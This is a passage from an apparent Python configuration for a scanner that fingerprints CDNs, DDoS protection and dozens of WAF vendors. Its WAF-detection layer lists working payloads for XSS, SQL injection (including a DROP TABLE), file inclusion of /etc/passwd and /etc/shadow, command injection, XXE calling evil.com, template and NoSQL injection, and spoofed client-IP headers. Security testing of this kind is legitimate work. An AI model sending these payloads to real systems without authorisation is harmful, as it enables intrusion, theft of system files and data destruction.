                    'akamai-request-id', 'akamai-ghost-ip', 'true-client-ip',
                    'akamai-edge-ip', 'x-akamai-transformed', 'x-akamai-staging',
                    
                    # Fastly headers
                    'x-served-by', 'x-cache', 'x-cache-hits', 'fastly-debug-digest',
                    'fastly-restarts', 'fastly-client-ip', 'fastly-ff', 'x-timer',
                    
                    # Azure CDN headers
                    'x-azure-ref', 'x-msedge-ref', 'x-cache', 'x-azure-fdid',
                    
                    # Google Cloud CDN headers
                    'x-goog-trace', 'x-cloud-trace-context', 'x-gfe-response-code-details-trace',
                    'x-goog-generation', 'x-goog-hash', 'x-goog-storage-class',
                    
                    # KeyCDN headers
                    'x-keycdn-pop', 'x-edge-location', 'x-pull-zone',
                    
                    # MaxCDN/StackPath headers
                    'x-maxcdn-pop', 'x-sp-edge-pop', 'x-stackpath-edge-pop',
                    
                    # BunnyCDN headers
                    'bunnycdn-cache-status', 'x-bunnycdn-pop', 'cdn-cache-control',
                    
                    # CDN77 headers
                    'x-cdn77-pop', 'x-cdn77-cache-status',
                    
                    # Quantil/BelugaCDN headers
                    'x-qcdn-pop', 'x-beluga-cache-status',
                    
                    # Limelight headers
                    'x-llnw-pop', 'x-ll-pop', 'x-ll-cache',
                    
                    # Edgecast/Verizon headers
                    'x-ec-debug', 'x-ec-cache', 'x-ec-cache-key', 'x-ec-check-cacheable',
                    
                    # Incapsula/Imperva headers
                    'x-iinfo', 'x-cdn', 'incap-ses', 'visid_incap',
                    
                    # CacheFly headers
                    'x-cf-pop', 'x-cf-served-by', 'x-cf-cache-status',
                    
                    # Sucuri headers
                    'x-sucuri-id', 'x-sucuri-cache', 'x-sucuri-block',
                    
                    # Chinese CDNs
                    'ali-cdn-cache-status', 'x-ali-cdn-pop', 'x-tengxun-cache',
                    'x-tencent-cache', 'x-baidu-cache', 'x-qiniu-cache',
                    'x-upyun-cache', 'x-cc-cache', 'x-ws-cache',
                    
                    # European CDNs  
                    'x-ovh-cache', 'x-scaleway-cache', 'x-hetzner-cache',
                    'x-do-cache', 'x-linode-cache', 'x-vultr-cache',
                    
                    # Video CDNs
                    'x-wowza-cache', 'x-jwplayer-cache', 'x-bc-cache',
                    'x-vimeo-cache', 'x-yt-cache', 'x-twitch-cache',
                    
                    # Generic detection headers
                    'x-cdn-pop', 'x-edge-location', 'x-pop', 'x-cache-status',
                    'x-served-by', 'x-cache', 'x-proxy-cache', 'x-hit',
                    'x-origin-pop', 'x-edge-server', 'x-cdn-server',
                    
                    # Security CDN headers
                    'x-waf-event-info', 'x-firewall-pop', 'x-security-check',
                    'x-ddos-protection', 'x-rate-limit-pop'
                ],
                'timing_analysis': True,
                'geo_routing_test': True,
                
                # Additional detection methods
                'advanced_detection': {
                    # Test CDN-specific endpoints
                    'test_endpoints': [
                        '/__cf_cache_status',  # Cloudflare
                        '/__aws_cf_status',     # CloudFront  
                        '/__fastly_status',     # Fastly
                        '/__akamai_status',     # Akamai
                        '/__keycdn_status',     # KeyCDN
                        '/__bunny_status',      # BunnyCDN
                        '/__cdn77_status',      # CDN77
                        '/__maxcdn_status'      # MaxCDN
                    ],
                    
                    # DNS-based detection
                    'dns_patterns': [
                        # Cloudflare patterns
                        '*.cloudflaressl.com', '*.cloudflare.com', '*.cf-*.com',
                        
                        # AWS CloudFront patterns
                        '*.cloudfront.net', '*.amazonaws.com', '*.awsglobalaccelerator.com',
                        
                        # Akamai patterns  
                        '*.akamaized.net', '*.akamaitechnologies.com', '*.akamai.net',
                        '*.edgesuite.net', '*.edgekey.net',
                        
                        # Fastly patterns
                        '*.fastly.com', '*.fastlylb.net', '*.fastly-analytics.com',
                        
                        # Other major CDNs
                        '*.maxcdn.com', '*.stackpathcdn.com', '*.keycdn.com',
                        '*.bunnycdn.com', '*.cdn77.com', '*.quantil.com',
                        '*.belugacdn.com', '*.sucuri.net',
                        
                        # Chinese CDNs
                        '*.alicdn.com', '*.aliyuncs.com', '*.myqcloud.com',
                        '*.qiniucdn.com', '*.upaiyun.com', '*.chinacache.com',
                        
                        # Video CDNs
                        '*.jwplatform.com', '*.brightcove.com', '*.vimeocdn.com',
                        '*.ytimg.com', '*.googlevideo.com'
                    ],
                    
                    # Response body fingerprinting
                    'body_fingerprints': {
                        'cloudflare': [
                            'cloudflare', 'cf-ray', 'ray id:', 'checking your browser',
                            'ddos protection by cloudflare', '__cf_bm'
                        ],
                        'aws_cloudfront': [
                            'cloudfront', 'generated by cloudfront', 'aws cloudfront',
                            'request id:', 'amazon cloudfront'
                        ],
                        'akamai': [
                            'akamai', 'reference #', 'akamai ghost', 'edgescape',
                            'akamai netsession', 'ghost ip'
                        ],
                        'fastly': [
                            'fastly', 'fastly error', 'varnish', 'fastly cdn',
                            'request id', 'fastly shield'
                        ],
                        'maxcdn': [
                            'maxcdn', 'netdna', 'stackpath', 'max cdn',
                            'pull zone', 'edge location'
                        ],
                        'keycdn': [
                            'keycdn', 'key cdn', 'zone id', 'pop location'
                        ],
                        'bunnycdn': [
                            'bunnycdn', 'bunny cdn', 'pull zone', 'edge server'
                        ],
                        'incapsula': [
                            'incapsula', 'imperva', 'incap_ses', 'visid_incap',
                            'security incident', 'access denied'
                        ]
                    },
                    
                    # SSL Certificate patterns
                    'ssl_patterns': [
                        '*.cloudflaressl.com', '*.cloudflare.com',
                        '*.amazonaws.com', '*.awsglobalaccelerator.com',
                        '*.akamai.com', '*.akamaized.net',
                        '*.fastly.com', '*.fastlylb.net',
                        '*.maxcdn.com', '*.stackpathcdn.com'
                    ],
                    
                    # IP Range detection (examples)
                    'ip_ranges': {
                        'cloudflare': ['103.21.244.0/22', '103.22.200.0/22', '103.31.4.0/22'],
                        'aws_cloudfront': ['13.32.0.0/15', '13.35.0.0/16', '13.54.0.0/15'],
                        'akamai': ['23.0.0.0/12', '104.64.0.0/10', '184.24.0.0/13'],
                        'fastly': ['23.235.32.0/20', '43.249.72.0/22', '103.244.50.0/24']
                    },
                    
                    # Performance characteristics
                    'performance_signatures': {
                        'latency_patterns': {
                            'edge_cdn': {'min': 10, 'max': 50},    # Very fast edge cache
                            'regional_cdn': {'min': 50, 'max': 150}, # Regional cache
                            'origin': {'min': 150, 'max': 1000}      # Direct to origin
                        },
                        'cache_behavior': {
                            'aggressive_caching': ['cloudflare', 'maxcdn'],
                            'moderate_caching': ['aws_cloudfront', 'fastly'],
                            'selective_caching': ['akamai', 'keycdn']
                        }
                    },
                
                # Error page signatures for detection
                'error_page_signatures': {
                    'cloudflare_errors': [
                        'error 1020', 'error 1006', 'ray id', 'cloudflare',
                        'checking your browser', 'ddos protection'
                    ],
                    'aws_errors': [
                        'cloudfront', 'generated by cloudfront', 'request id',
                        'the request could not be satisfied'
                    ],
                    'akamai_errors': [
                        'reference #', 'akamai', 'ghost ip', 'edgescape error'
                    ],
                    'fastly_errors': [
                        'fastly error', 'varnish error', 'guru meditation',
                        'service unavailable'
                    ],
                    'maxcdn_errors': [
                        'netdna', 'maxcdn error', 'stackpath error',
                        'pull zone error'
                    ]
                },
                
                # JavaScript-based detection
                'javascript_detection': {
                    'cloudflare_js': ['__cf_bm', 'cf_challenge_response', '_cf_chl_opt'],
                    'incapsula_js': ['_incap_ses', 'incap_ses', 'visid_incap'],
                    'sucuri_js': ['sucuri_cloudproxy_js', 'sucuri_waf'],
                    'ddosguard_js': ['ddos-guard', 'ddg-challenge'],
                    'akamai_js': ['_abck', 'ak_bmsc', 'akamai_bm']
                }
            }
            },

            # Layer 2: DDoS Protection Detection  
            'ddos_protection_detection': {
                'priority': 2,
                'headers': {
                    'X-DDoS-Test': markers['uuid'],
                    'User-Agent': f'SecurityTest-{markers["sequence"]}',
                    'X-Rate-Limit-Test': markers['uuid']
                },
                'rate_limit_tests': {
                    'burst_requests': 50,
                    'time_window': 10,
                    'escalation_pattern': [1, 5, 10, 25, 50]
                },
                'challenge_detection': [
                    'cloudflare_challenge', 'incapsula_challenge', 'sucuri_firewall',
                    'akamai_bot_manager', 'imperva_challenge'
                ],
                'js_challenge_markers': [markers['uuid']],
                'captcha_detection': True
            },

            # Layer 3: WAF Detection (Multi-vendor)
            # Layer 3: WAF Detection (Multi-vendor Extended)
            'waf_detection': {
                'priority': 3,
                'payloads': {
                    'xss_tests': [
                        f"/?xss=<script>alert('{markers['uuid']}')</script>",
                        f"/?xss=javascript:alert('{markers['uuid']}')",
                        f"/?xss=<img src=x onerror=alert('{markers['uuid']}')>",
                        f"/?xss=<svg onload=alert('{markers['uuid']}')>",
                        f"/?xss=<iframe src=javascript:alert('{markers['uuid']}')>",
                        f"/?xss=<body onload=alert('{markers['uuid']}')>",
                        f"/?xss=<details open ontoggle=alert('{markers['uuid']}')>",
                        f"/?xss=<marquee onstart=alert('{markers['uuid']}')>",
                        f"/?xss=<video><source onerror=\"alert('{markers['uuid']}')\">",
                        f"/?xss=<audio src=x onerror=alert('{markers['uuid']}')>",
                        f"/?xss=<select onfocus=alert('{markers['uuid']}') autofocus>",
                        f"/?xss='><script>alert('{markers['uuid']}')</script>",
                        f"/?xss=\"><script>alert('{markers['uuid']}')</script>",
                        f"/?xss=</script><script>alert('{markers['uuid']}')</script>",
                        f"/?xss=<ScRiPt>alert('{markers['uuid']}')</ScRiPt>",
                        f"/?xss=<script/src=data:,alert('{markers['uuid']}')>",
                        f"/?xss=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,{markers['uuid']},39,41))</script>"
                    ],
                    'sqli_tests': [
                        f"/?sql=' OR 1=1 -- {markers['uuid']}",
                        f"/?sql=' UNION SELECT '{markers['uuid']}' --",
                        f"/?sql=1'; DROP TABLE users; -- {markers['uuid']}",
                        f"/?sql=1' AND SLEEP(5) -- {markers['uuid']}",
                        f"/?sql=1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 -- {markers['uuid']}",
                        f"/?sql=1' UNION SELECT NULL,NULL,'{markers['uuid']}' --",
                        f"/?sql=1'; WAITFOR DELAY '00:00:05' -- {markers['uuid']}",
                        f"/?sql=1' AND SUBSTRING(@@version,1,1)='M' -- {markers['uuid']}",
                        f"/?sql=1' OR '1'='1' -- {markers['uuid']}",
                        f"/?sql=1' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>64 -- {markers['uuid']}",
                        f"/?sql=1' AND (SELECT user FROM mysql.user WHERE user='{markers['uuid']}' LIMIT 1)='test' --",
                        f"/?sql=1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT('{markers['uuid']}',0x3a,FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x) --",
                        f"/?sql=1' UNION ALL SELECT 1,2,3,4,'{markers['uuid']}',6 --",
                        f"/?sql=1' AND 1=CAST('{markers['uuid']}' AS INT) --",
                        f"/?sql=1'; INSERT INTO temp VALUES('{markers['uuid']}'); --",
                        f"/?sql=1' AND EXTRACTVALUE(1,CONCAT(0x7e,'{markers['uuid']}',0x7e)) --"
                    ],
                    'lfi_tests': [
                        f"/?file=../../../etc/passwd#{markers['uuid']}",
                        f"/?file=....//....//....//etc/passwd#{markers['uuid']}",
                        f"/?file=/etc/passwd%00{markers['uuid']}",
                        f"/?file=php://filter/resource=index.php#{markers['uuid']}",
                        f"/?file=../../../windows/system32/drivers/etc/hosts#{markers['uuid']}",
                        f"/?file=/proc/self/environ#{markers['uuid']}",
                        f"/?file=/proc/version#{markers['uuid']}",
                        f"/?file=data:text/plain,{markers['uuid']}",
                        f"/?file=expect://id#{markers['uuid']}",
                        f"/?file=php://filter/convert.base64-encode/resource=index#{markers['uuid']}",
                        f"/?file=zip://test.zip%23{markers['uuid']}.txt",
                        f"/?file=phar://test.phar/{markers['uuid']}.txt",
                        f"/?file=/var/log/apache2/access.log#{markers['uuid']}",
                        f"/?file=/var/log/httpd/access_log#{markers['uuid']}",
                        f"/?file=/etc/shadow#{markers['uuid']}",
                        f"/?file=....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts#{markers['uuid']}"
                    ],
                    'rce_tests': [
                        f"/?cmd=id;echo {markers['uuid']}",
                        f"/?cmd=`id`;echo {markers['uuid']}",
                        f"/?cmd=$(id);echo {markers['uuid']}",
                        f"/?cmd=|id;echo {markers['uuid']}",
                        f"/?cmd=id&&echo {markers['uuid']}",
                        f"/?cmd=id||echo {markers['uuid']}",
                        f"/?cmd=id&echo {markers['uuid']}",
                        f"/?cmd=id%3Becho+{markers['uuid']}",
                        f"/?cmd=id%26%26echo+{markers['uuid']}",
                        f"/?cmd=id%7C%7Cecho+{markers['uuid']}",
                        f"/?cmd=id%26echo+{markers['uuid']}",
                        f"/?cmd=whoami;echo {markers['uuid']}",
                        f"/?cmd=cat /etc/passwd;echo {markers['uuid']}",
                        f"/?cmd=ls -la;echo {markers['uuid']}",
                        f"/?cmd=uname -a;echo {markers['uuid']}",
                        f"/?cmd=ps aux;echo {markers['uuid']}",
                        f"/?cmd=netstat -an;echo {markers['uuid']}",
                        f"/?cmd=ifconfig;echo {markers['uuid']}",
                        f"/?cmd=env;echo {markers['uuid']}",
                        f"/?cmd=python -c 'import os;os.system(\"echo {markers['uuid']}\")'"
                    ],
                    'xxe_tests': [
                        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "{markers['uuid']}">]><root>&test;</root>""",
                        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;{markers['uuid']}</root>""",
                        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>{markers['uuid']}</root>""",
                        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "expect://id">]><root>&test;{markers['uuid']}</root>""",
                        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&test;{markers['uuid']}</root>"""
                    ],
                    'path_traversal_tests': [
                        f"/?path=../../../etc/passwd#{markers['uuid']}",
                        f"/?path=..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts#{markers['uuid']}",
                        f"/?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd#{markers['uuid']}",
                        f"/?path=....//....//....//etc//passwd#{markers['uuid']}",
                        f"/?path=/var/www/html/../../../../etc/passwd#{markers['uuid']}"
                    ],
                    'ldap_injection_tests': [
                        f"/?ldap=admin)({markers['uuid']}=*",
                        f"/?ldap=*)(uid=*))(|(uid=*#{markers['uuid']}",
                        f"/?ldap=admin)(!({markers['uuid']}=*)",
                        f"/?ldap=*)(|(password=*)#{markers['uuid']}"
                    ],
                    'ssti_tests': [
                        f"/?template={{7*7}}{markers['uuid']}",
                        f"/?template=${{7*7}}{markers['uuid']}",
                        f"/?template=<%=7*7%>{markers['uuid']}",
                        f"/?template=#{{{7*7}}}{markers['uuid']}",
                        f"/?template={{config}}{markers['uuid']}",
                        f"/?template={{''.__class__.__mro__[2].__subclasses__()}}{markers['uuid']}"
                    ],
                    'nosql_injection_tests': [
                        f"/?nosql[$ne]={markers['uuid']}",
                        f"/?nosql[$regex]=.*{markers['uuid']}.*",
                        f"/?nosql[$where]=function(){{return this.password.match(/{markers['uuid']}/)}}",
                        f"/?nosql[$gt]={markers['uuid']}"
                    ],
                    'header_injection_tests': [
                        f"HTTP/1.1 200 OK\\r\\nX-Injected-Header: {markers['uuid']}\\r\\n\\r\\n",
                        f"/?redirect=http://evil.com/{markers['uuid']}",
                        f"/?url=javascript:alert('{markers['uuid']}')"
                    ]
                },
                'waf_signatures': {
                    # Major Cloud WAFs
                    'cloudflare': {
                        'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id', 'server: cloudflare'],
                        'cookies': ['__cfduid', '__cf_bm', 'cf_clearance'],
                        'response_codes': [403, 429, 1020, 1010, 1006],
                        'body_patterns': ['cloudflare', 'ray id:', 'checking your browser', 'ddos protection'],
                        'error_pages': ['error 1020', 'error 1006', 'access denied']
                    },
                    'aws_waf': {
                        'headers': ['x-amzn-trace-id', 'x-amzn-requestid', 'x-amz-apigw-id'],
                        'cookies': [],
                        'response_codes': [403, 429],
                        'body_patterns': ['aws', 'amazon', 'blocked by aws waf'],
                        'error_pages': ['access forbidden', 'request blocked']
                    },
                    'azure_waf': {
                        'headers': ['x-azure-ref', 'x-msedge-ref'],
                        'cookies': [],
                        'response_codes': [403, 429],
                        'body_patterns': ['azure', 'microsoft', 'blocked by azure'],
                        'error_pages': ['access denied']
                    },
                    'google_cloud_armor': {
                        'headers': ['x-goog-trace', 'x-cloud-trace-context'],
                        'cookies': [],
                        'response_codes': [403, 429],
                        'body_patterns': ['google cloud', 'cloud armor', 'blocked by cloud armor'],
                        'error_pages': ['access forbidden']
                    },
                    
                    # Major Commercial WAFs
                    'akamai': {
                        'headers': ['akamai-origin-hop', 'akamai-transformed', 'x-akamai-transformed'],
                        'cookies': ['_abck', 'ak_bmsc'],
                        'response_codes': [403, 429],
                        'body_patterns': ['akamai', 'reference #', 'akamai ghost'],
                        'error_pages': ['access denied', 'reference #']
                    },
                    'imperva_incapsula': {
                        'headers': ['x-iinfo', 'x-cdn'],
                        'cookies': ['incap_ses', 'visid_incap', 'incap_ses'],
                        'response_codes': [403, 406, 429],
                        'body_patterns': ['incapsula', 'imperva', 'request unsuccessful'],
                        'error_pages': ['request unsuccessful', 'incident id']
                    },
                    'f5_asm': {
                        'headers': ['x-f5-bigip', 'f5-bigip', 'bigip'],
                        'cookies': ['f5_cspm', 'bigipserver', 'f5avraaaaaaaaaaaaaaaa'],
                        'response_codes': [403, 406],
                        'body_patterns': ['f5', 'bigip', 'the requested url was rejected'],
                        'error_pages': ['the requested url was rejected', 'please consult with your administrator']
                    },
                    'barracuda': {
                        'headers': ['x-barracuda-url', 'x-barra-counter'],
                        'cookies': ['barra_counter_session'],
                        'response_codes': [403, 404],
                        'body_patterns': ['barracuda', 'barra', 'blocked by barracuda'],
                        'error_pages': ['you have been blocked', 'barracuda web application firewall']
                    },
                    'citrix_netscaler': {
                        'headers': ['ns_af', 'citrix_ns_id', 'netscaler'],
                        'cookies': ['ns_af', 'citrix_ns_id'],
                        'response_codes': [403],
                        'body_patterns': ['netscaler', 'citrix', 'access denied'],
                        'error_pages': ['access denied']
                    },
                    'fortinet_fortiweb': {
                        'headers': ['x-forwarded-for'],
                        'cookies': ['fortiwafsid'],
                        'response_codes': [403],
                        'body_patterns': ['fortinet', 'fortigate', 'fortiweb', 'blocked by fortinet'],
                        'error_pages': ['web page blocked', 'fortigate']
                    },
                    'checkpoint_cloudguard': {
                        'headers': ['cp_session_id'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['checkpoint', 'cloudguard', 'access denied'],
                        'error_pages': ['access denied by checkpoint']
                    },
                    
                    # Open Source WAFs
                    'modsecurity': {
                        'headers': ['mod_security', 'modsec'],
                        'cookies': [],
                        'response_codes': [403, 406, 501],
                        'body_patterns': ['mod_security', 'modsecurity', 'not acceptable'],
                        'error_pages': ['not acceptable', 'mod_security action']
                    },
                    'nginx_naxsi': {
                        'headers': ['naxsi/waf'],
                        'cookies': [],
                        'response_codes': [403, 418],
                        'body_patterns': ['naxsi', 'unusual request'],
                        'error_pages': ['malformed request', 'unusual request']
                    },
                    
                    # Specialized/Security-focused WAFs
                    'sucuri': {
                        'headers': ['x-sucuri-id', 'x-sucuri-cache'],
                        'cookies': ['sucuri_cloudproxy_uuid_'],
                        'response_codes': [403],
                        'body_patterns': ['sucuri', 'access denied', 'blocked by sucuri'],
                        'error_pages': ['access denied', 'questions?']
                    },
                    'wordfence': {
                        'headers': [],
                        'cookies': ['wfwaf-authcookie'],
                        'response_codes': [403, 503],
                        'body_patterns': ['wordfence', 'generated by wordfence'],
                        'error_pages': ['this response was generated by wordfence', 'your access to this site']
                    },
                    'wallarm': {
                        'headers': ['x-wallarm-mode'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['wallarm', 'blocked by wallarm'],
                        'error_pages': ['request blocked']
                    },
                    'radware': {
                        'headers': ['x-defended-by'],
                        'cookies': ['rdx'],
                        'response_codes': [403],
                        'body_patterns': ['radware', 'application firewall'],
                        'error_pages': ['unauthorized request blocked']
                    },
                    'edgecast': {
                        'headers': ['server: ecs'],
                        'cookies': [],
                        'response_codes': [403, 400],
                        'body_patterns': ['edgecast', 'unauthorized request'],
                        'error_pages': ['unauthorized request']
                    },
                    'alert_logic': {
                        'headers': ['al_sess', 'al_lb'],
                        'cookies': ['al_sess'],
                        'response_codes': [403],
                        'body_patterns': ['alert logic', 'alertlogic'],
                        'error_pages': ['access denied']
                    },
                    'approach': {
                        'headers': ['approach'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['approach', 'blocked by approach'],
                        'error_pages': ['blocked by approach']
                    },
                    'armor': {
                        'headers': ['armor'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['armor defense'],
                        'error_pages': ['blocked by armor']
                    },
                    'aws_elb': {
                        'headers': ['awsalb', 'awsalbcors'],
                        'cookies': ['awsalb', 'awsalbcors'],
                        'response_codes': [403, 503],
                        'body_patterns': ['aws', 'application load balancer'],
                        'error_pages': ['service temporarily unavailable']
                    },
                    'baidu_yunjiasu': {
                        'headers': ['yunjiasu-nginx'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['yunjiasu', 'baidu'],
                        'error_pages': ['blocked by yunjiasu']
                    },
                    'bekchy': {
                        'headers': ['bekchy - backend server'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['bekchy'],
                        'error_pages': ['blocked by bekchy']
                    },
                    'binarysec': {
                        'headers': ['binarysec'],
                        'cookies': [],
                        'response_codes': [403, 400],
                        'body_patterns': ['binarysec', 'blocked by binarysec'],
                        'error_pages': ['request blocked by binarysec']
                    },
                    'blockdos': {
                        'headers': ['blockdos.net'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['blockdos', 'you have been blocked'],
                        'error_pages': ['you have been blocked']
                    },
                    'cerber': {
                        'headers': [],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['cerber security', 'access denied'],
                        'error_pages': ['we are sorry, but this page is blocked', 'cerber security']
                    },
                    'chinacache': {
                        'headers': ['powered-by-chinacache'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['chinacache'],
                        'error_pages': ['blocked by chinacache']
                    },
                    'cloudbric': {
                        'headers': ['x-cloudbric-request-id'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['cloudbric', 'blocked by cloudbric'],
                        'error_pages': ['malicious/abnormal request blocked']
                    },
                    'comodo': {
                        'headers': ['protected-by', 'server: cwaf'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['comodo', 'protected by comodo waf'],
                        'error_pages': ['access denied']
                    },
                    'deny_all': {
                        'headers': ['sessioncookie'],
                        'cookies': ['sessioncookie'],
                        'response_codes': [403],
                        'body_patterns': ['denyall', 'condition intercepted'],
                        'error_pages': ['condition intercepted']
                    },
                    'dotdefender': {
                        'headers': ['x-dotdefender-denied'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['dotdefender', 'applicure dotdefender'],
                        'error_pages': ['dotdefender blocked your request']
                    },
                    'hyperguard': {
                        'headers': ['hyperguard'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['hyperguard', 'unauthorized request blocked'],
                        'error_pages': ['unauthorized request blocked']
                    },
                    'jiasule': {
                        'headers': ['jiasule-waf'],
                        'cookies': ['jsluid', '__jsluid'],
                        'response_codes': [403, 400],
                        'body_patterns': ['jiasule', 'static.jiasule.com'],
                        'error_pages': ['notice-jiasule']
                    },
                    'knownsec': {
                        'headers': ['ks-waf'],
                        'cookies': [],
                        'response_codes': [403, 555],
                        'body_patterns': ['knownsec', 'ks-waf', 'blocked by knownsec'],
                        'error_pages': ['request denied by knownsec']
                    },
                    'malcare': {
                        'headers': [],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['malcare', 'firewall', 'blocked by malcare'],
                        'error_pages': ['blocked because of malicious activities']
                    },
                    'newdefend': {
                        'headers': ['newdefend'],
                        'cookies': [],
                        'response_codes': [403, 412],
                        'body_patterns': ['newdefend', 'request blocked'],
                        'error_pages': ['request blocked']
                    },
                    'nsfocus': {
                        'headers': ['nsfocus'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['nsfocus', 'blocked by nsfocus'],
                        'error_pages': ['blocked by nsfocus waf']
                    },
                    'palo_alto': {
                        'headers': ['server: pa-vm'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['palo alto', 'pan-os'],
                        'error_pages': ['access denied']
                    },
                    'profense': {
                        'headers': ['profense'],
                        'cookies': [],
                        'response_codes': [403, 406],
                        'body_patterns': ['profense', 'plixer'],
                        'error_pages': ['request blocked by profense']
                    },
                    'reblaze': {
                        'headers': ['rbzid'],
                        'cookies': ['rbzid'],
                        'response_codes': [403],
                        'body_patterns': ['reblaze', 'current request blocked'],
                        'error_pages': ['current request blocked']
                    },
                    'safe3': {
                        'headers': ['safe3waf'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['safe3', 'safe3 web application firewall'],
                        'error_pages': ['safe3 web application firewall']
                    },
                    'safedog': {
                        'headers': ['server: safedog', 'safedog'],
                        'cookies': ['safedog-flow-item'],
                        'response_codes': [403, 404, 405],
                        'body_patterns': ['safedog', 'wangzhan', '404 not found'],
                        'error_pages': ['404 not found']
                    },
                    'secupress': {
                        'headers': [],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['secupress', 'blocked by secupress'],
                        'error_pages': ['cool, you are totally forbidden']
                    },
                    'securi': {
                        'headers': ['x-sucuri-id'],
                        'cookies': ['sucuri_cloudproxy_uuid'],
                        'response_codes': [403],
                        'body_patterns': ['sucuri', 'cloudproxy'],
                        'error_pages': ['access denied']
                    },
                    'senginx': {
                        'headers': ['senginx'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['senginx', 'blocked by senginx'],
                        'error_pages': ['blocked by senginx']
                    },
                    'shadow_daemon': {
                        'headers': ['shadowd_ui'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['shadowd', 'shadow daemon'],
                        'error_pages': ['request blocked by shadow daemon']
                    },
                    'shieldsecurity': {
                        'headers': [],
                        'cookies': ['icwp-wpsf'],
                        'response_codes': [403],
                        'body_patterns': ['shield security', 'icwp'],
                        'error_pages': ['you were blocked by the shield']
                    },
                    'sonicwall': {
                        'headers': ['sonicwall'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['sonicwall', 'this request is blocked'],
                        'error_pages': ['this request is blocked by sonicwall']
                    },
                    'sophos': {
                        'headers': ['spdy'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['sophos', 'blocked by sophos'],
                        'error_pages': ['blocked by sophos utm']
                    },
                    'stingray': {
                        'headers': ['x-mapping'],
                        'cookies': [],
                        'response_codes': [403, 500],
                        'body_patterns': ['stingray', 'riverbed stingray'],
                        'error_pages': ['request rejected']
                    },
                    'tencent_cloud': {
                        'headers': ['server: tencent-cls'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['tencent', 'qcloud'],
                        'error_pages': ['blocked by tencent cloud waf']
                    },
                    'usp_secure_entry': {
                        'headers': ['usp-se'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['usp secure entry server'],
                        'error_pages': ['request denied by usp secure entry server']
                    },
                    'varnish': {
                        'headers': ['x-varnish', 'via'],
                        'cookies': [],
                        'response_codes': [403, 503],
                        'body_patterns': ['varnish', 'guru meditation'],
                        'error_pages': ['guru meditation', 'varnish cache server']
                    },
                    'webknight': {
                        'headers': ['webknight'],
                        'cookies': [],
                        'response_codes': [403, 999],
                        'body_patterns': ['webknight', 'http error 999'],
                        'error_pages': ['blocked by webknight']
                    },
                    'yundun': {
                        'headers': ['server: yundun'],
                        'cookies': ['yunsuo_session'],
                        'response_codes': [403],
                        'body_patterns': ['yundun', 'blocked by yundun'],
                        'error_pages': ['blocked by yundun']
                    },
                    'zenedge': {
                        'headers': ['x-zen-fury'],
                        'cookies': [],
                        'response_codes': [403],
                        'body_patterns': ['zenedge', 'request blocked'],
                        'error_pages': ['request has been blocked']
                    }
                },
                'headers': {
                    'User-Agent': f'Mozilla/5.0 (WAF-Test-{markers["uuid"]})',
                    'X-WAF-Test': markers['uuid'],
                    'X-Attack-Test': markers['sequence'],
                    'X-Forwarded-For': '127.0.0.1',
                    'X-Originating-IP': '127.0.0.1',
                    'X-Remote-IP': '127.0.0.1',
                    'X-Client-IP': '127.0.0.1',
                    'X-Real-IP': '127.0.0.1',
                    'Client-IP': '127.0.0.1',
                    'True-Client-IP': '127.0.0.1',
                    'X-Cluster-Client-IP': '127.0.0.1'
                },
                
                # Advanced detection methods
                'advanced_detection': {
                    'timing_based_detection': {
                        'enabled': True,
                        'threshold_ms': 100,  # Delay indicating WAF processing
                        'multiple_requests': True,
                        'baseline_requests': 3
                    },
                    
                    'response_analysis': {
                        'status_code_patterns': {
                            'blocked': [403, 406, 412, 418, 429, 501, 503],
                            'rate_limited': [429, 509],
                            'suspicious': [400, 404, 405, 406, 412, 413, 414, 415, 416, 417, 418, 422, 429, 431, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511]
                        },
                        
                        'content_length_analysis': {
                            'enabled': True,
                            'suspicious_ranges': [
                                (0, 50),      # Very short responses
                                (200, 500),   # Typical error page size
                                (1000, 2000), # Common WAF error page size
                                (5000, 8000)  # Large WAF error pages
                            ]
                        },
                        
                        'response_time_analysis': {
                            'enabled': True,
